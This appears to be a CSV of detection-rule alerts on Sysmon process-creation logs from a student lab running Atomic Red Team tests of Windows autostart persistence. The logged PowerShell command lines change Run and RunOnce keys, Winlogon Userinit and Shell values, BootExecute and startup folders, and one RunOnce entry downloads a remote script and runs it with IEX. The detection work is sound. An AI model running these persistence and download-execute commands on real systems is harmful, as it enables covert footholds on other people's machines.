\""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:55.196","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.140 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173593,"Cmdline: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\batstartup.bat\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\"""" Start-Process \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat\"""" Start-Process \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:57.126","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:05.217 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173605,"Cmdline: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$Target = \""""C:\Windows\System32\calc.exe\"""" $ShortcutLocation = \""""$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk\"""" $WScriptShell = New-Object -ComObject WScript.Shell $Create = $WScriptShell.CreateShortcut($ShortcutLocation) $Create.TargetPath = $Target $Create.Save()} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:05.197","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.443 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173613,"Cmdline: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.428","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.229 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173616,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Common Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:08.218","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.021 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173619,"Cmdline: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {New-Item -ItemType Directory -path \""""$env:TMP\atomictest\\"""" Copy-Item -path \""""C:\Windows\System32\calc.exe\"""" -destination \""""$env:TMP\atomictest\\"""" Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\"""" -Name \""""Startup\"""" -Value \""""$env:TMP\atomictest\\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:11.003","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:12.412 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173623,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\"""" } if (!(Test-Path -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:12.400","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.697 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173626,"Cmdline: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""")){ New-Item -ItemType Key -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" } Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"""" -Name \""""atomictest\"""" -Value \""""C:\Windows\System32\calc.exe\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:13.680","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.429 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173629,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""" C:\Windows\System32\calc.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Userinit\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:16.419","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.103 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173633,"Cmdline: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$oldvalue = $(Get-ItemPropertyValue -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\""""); Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell-backup\"""" -Value \""""$oldvalue\""""; $newvalue = $oldvalue + \"""", C:\Windows\explorer.exe\""""; Set-ItemProperty -Path \""""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"""" -Name \""""Shell\"""" -Value \""""$newvalue\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:17.088","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.455 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173641,"Cmdline: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {if (!(Test-Path \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""")) { reg.exe export \""""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\"""" \""""C:\AtomicRedTeam\atomics\T1547.001\src\SessionManagerBackup.reg\"""" /y } Set-ItemProperty -Path \""""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\"""" -Name \""""BootExecute\"""" -Value \""""autocheck autoche *\"""" -Type MultiString} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:18.441","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.443 +01:00","Change PowerShell Policies to an Insecure Level","med","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173613,"Cmdline: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunKey = \""""HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\"""" Set-ItemProperty -Path $RunKey -Name \""""socks5_powershell\"""" -Value \""""powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\""""} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:19:07.428","proc_creation_win_powershell_set_policies_to_unsecure_level.yml","6367ead5-724d-1865-8861-5eb5c91278d7","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.928 +01:00","Suspicious PowerShell Download and Execute Pattern","high","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",173564,"Cmdline: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass ¦ LID: 0x1894a ¦ LGUID: E9F06A57-5FE2-694E-4A89-010000000000 ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400 ¦ ParentPID: 9132 ¦ ParentPGUID: E9F06A57-602B-694E-E700-000000002400 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\"""" set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'} ¦ CurrentDirectory: C:\Users\student\AppData\Local\Temp\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-26 10:18:49.675","proc_creation_win_powershell_susp_download_patterns.yml","32266c6c-b44a-9ae2-9d4a-728b6d52a30d","C:\Tools\Logs\art_1547_001.evtx"
